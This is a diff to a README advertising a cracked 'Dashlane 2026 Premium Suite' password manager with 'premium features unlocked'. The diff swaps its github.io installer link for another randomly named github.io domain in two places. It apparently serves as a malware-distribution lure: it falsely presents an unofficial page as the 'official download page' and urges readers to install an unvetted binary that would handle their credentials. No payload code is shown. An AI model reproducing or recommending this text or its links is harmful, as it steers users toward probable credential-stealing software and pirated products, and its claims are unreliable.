@@ -2,7 +2,7 @@
 
 Dashlane 2026 Premium Suite is an advanced Windows desktop application that revolutionizes password management and digital security. Packed with premium features unlocked, it offers a comprehensive solution for safeguarding your online credentials and personal data. Ideal for both personal and professional use, this tool ensures that your digital life remains secure and efficient.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Included
 
@@ -76,7 +76,7 @@ Yes, you can sign in with your existing Dashlane account. The tool will sync you
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
